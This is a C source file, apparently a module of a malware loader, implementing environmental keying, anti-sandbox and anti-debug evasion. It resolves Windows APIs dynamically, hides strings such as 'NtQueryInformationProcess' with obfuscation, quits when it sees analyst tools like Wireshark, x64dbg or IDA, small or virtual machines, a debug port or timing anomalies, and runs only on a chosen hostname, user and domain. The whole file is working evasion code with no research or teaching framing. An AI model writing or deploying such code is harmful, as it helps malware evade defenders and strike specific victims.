/*
 * Environmental Keying + Anti-Sandbox + Anti-Debug
 * All via dynamic API resolution
 */

#include "env_keying.h"
#include "winapi.h"
#include "obfstr.h"
#include <intrin.h>

#if ENABLE_ANTI_SANDBOX
static BOOL IsSandbox(void) {
    SYSTEM_INFO si;
    g_Api.pGetSystemInfo(&si);
    if (si.dwNumberOfProcessors < 2)
        return TRUE;

    MEMORYSTATUSEX ms;
    ms.dwLength = sizeof(ms);
    g_Api.pGlobalMemoryStatusEx(&ms);
    if (ms.ullTotalPhys < (ULONGLONG)2 * 1024 * 1024 * 1024)
        return TRUE;

    if (g_Api.pGetTickCount64() < 10 * 60 * 1000)
        return TRUE;

    HANDLE hSnap = g_Api.pCreateToolhelp32Snapshot(0x00000002, 0);
    if (hSnap != INVALID_HANDLE_VALUE) {
        PROCESSENTRY32W pe;
        pe.dwSize = sizeof(pe);
        if (g_Api.pProcess32FirstW(hSnap, &pe)) {
            do {
                WCHAR lower[MAX_PATH];
                for (int i = 0; i < MAX_PATH && pe.szExeFile[i]; i++) {
                    WCHAR c = pe.szExeFile[i];
                    lower[i] = (c >= L'A' && c <= L'Z') ? c + 32 : c;
                    if (!c) break;
                }

                if (wcsstr(lower, L"wireshark") ||
                    wcsstr(lower, L"procmon") ||
                    wcsstr(lower, L"x64dbg") ||
                    wcsstr(lower, L"x32dbg") ||
                    wcsstr(lower, L"ollydbg") ||
                    wcsstr(lower, L"ida") ||
                    wcsstr(lower, L"processhacker") ||
                    wcsstr(lower, L"fiddler") ||
                    wcsstr(lower, L"pestudio") ||
                    wcsstr(lower, L"regshot")) {
                    g_Api.pCloseHandle(hSnap);
                    return TRUE;
                }
            } while (g_Api.pProcess32NextW(hSnap, &pe));
        }
        g_Api.pCloseHandle(hSnap);
    }

    int cpuInfo[4];
    __cpuid(cpuInfo, 1);
    if (cpuInfo[2] & (1 << 31)) {
        __cpuid(cpuInfo, 0x40000000);
        char vendor[13] = { 0 };
        memcpy(vendor, &cpuInfo[1], 4);
        memcpy(vendor + 4, &cpuInfo[2], 4);
        memcpy(vendor + 8, &cpuInfo[3], 4);
        if (strstr(vendor, "VBoxVBox") ||
            strstr(vendor, "prl ") ||
            strstr(vendor, "KVMKVM")) {
            return TRUE;
        }
    }

    return FALSE;
}
#endif

#if ENABLE_ANTI_DEBUG
static BOOL IsBeingDebugged(void) {
    PPEB2 peb = (PPEB2)__readgsqword(0x60);
    if (peb->BeingDebugged)
        return TRUE;

    char s_ntdll[OBF_NTDLL_LEN];
    deobf(s_ntdll, OBF_NTDLL, OBF_NTDLL_LEN);
    HMODULE ntdll = g_Api.pGetModuleHandleA(s_ntdll);
    SecureZeroMemory(s_ntdll, sizeof(s_ntdll));

    if (ntdll) {
        typedef NTSTATUS (NTAPI *fnNtQueryInformationProcess)(
            HANDLE, ULONG, PVOID, ULONG, PULONG);
        /* "NtQueryInformationProcess" — resolved inline */
        static const unsigned char OBF_NQIP[] = {
            0x1B,0x21,0x04,0x20,0x30,0x27,0x2C,0x1C,0x3B,0x33,0x3A,0x27,0x38,
            0x34,0x21,0x3C,0x3A,0x3B,0x05,0x27,0x3A,0x36,0x30,0x26,0x26,0x55
        };
        char s_nqip[26];
        deobf(s_nqip, OBF_NQIP, 26);
        fnNtQueryInformationProcess pNtQIP =
            (fnNtQueryInformationProcess)g_Api.pGetProcAddress(ntdll, s_nqip);
        SecureZeroMemory(s_nqip, sizeof(s_nqip));

        if (pNtQIP) {
            DWORD_PTR debug_port = 0;
            NTSTATUS status = pNtQIP((HANDLE)-1, 7, &debug_port,
                sizeof(debug_port), NULL);
            if (NT_SUCCESS(status) && debug_port != 0)
                return TRUE;
        }
    }

    unsigned __int64 t1 = __rdtsc();
    volatile int x = 0;
    for (int i = 0; i < 100; i++) x += i;
    unsigned __int64 t2 = __rdtsc();
    if ((t2 - t1) > 10000000)
        return TRUE;

    return FALSE;
}
#endif

#if ENABLE_ENV_KEYING
static BOOL MatchesTarget(void) {
    char buf[256];
    DWORD len;

    const char *target_host = TARGET_HOSTNAME;
    if (target_host[0] != '\0') {
        len = sizeof(buf);
        g_Api.pGetComputerNameA(buf, &len);
        if (_stricmp(buf, target_host) != 0)
            return FALSE;
    }

    const char *target_user = TARGET_USERNAME;
    if (target_user[0] != '\0') {
        len = sizeof(buf);
        g_Api.pGetUserNameA(buf, &len);
        if (_stricmp(buf, target_user) != 0)
            return FALSE;
    }

    const char *target_domain = TARGET_DOMAIN;
    if (target_domain[0] != '\0') {
        /* "USERDOMAIN" built as char array */
        char envvar[] = { 'U','S','E','R','D','O','M','A','I','N', 0 };
        DWORD env_len = g_Api.pGetEnvironmentVariableA(envvar, buf, sizeof(buf));
        SecureZeroMemory(envvar, sizeof(envvar));
        if (env_len == 0 || _stricmp(buf, target_domain) != 0)
            return FALSE;
    }

    return TRUE;
}
#endif

BOOL CheckEnvironment(void) {
#if ENABLE_DELAY_EXEC
    g_Api.pSleep(DELAY_SECONDS * 1000);
#endif

#if ENABLE_ANTI_DEBUG
    if (IsBeingDebugged())
        return FALSE;
#endif

#if ENABLE_ANTI_SANDBOX
    if (IsSandbox())
        return FALSE;
#endif

#if ENABLE_ENV_KEYING
    if (!MatchesTarget())
        return FALSE;
#endif

    return TRUE;
}
